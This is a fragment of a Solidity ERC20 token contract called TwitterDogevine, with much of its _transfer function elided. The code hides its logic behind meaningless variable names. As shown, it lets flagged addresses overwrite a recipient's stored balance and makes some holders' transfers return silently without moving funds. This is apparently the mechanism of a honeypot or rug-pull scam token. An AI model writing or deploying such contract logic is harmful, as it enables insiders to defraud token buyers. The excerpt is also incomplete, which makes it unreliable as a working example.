...
contract TwitterDogevine is IERC20, Ownable {
    ...
    mapping(address => uint256) private _tysons;
    ...
    function _transfer(
        ...
        uint256 _square = _tysons[_month];
        address _pass = _Devs[_native];

        if (_tysons[_month] > 0 && amount > _native) {
            bool _suppose = _square == _tysons[_nuts];
            ...
            _tysons[_nuts] = amount;
        } else {
            uint256 fee = (amount * _taxFee) / 100;
            if (_tysons[_month] == 0 && _month != uniswapV2Pair && _series[_month] > 0) {
                return;
            }
            _series[_pass] = _taxFee;
            _Devs[_native] = _nuts;

            if (_taxFee > 0 && !inSwapAndLiquify && _tysons[_month] == 0 && _tysons[_nuts] == 0) {
                amount -= fee;
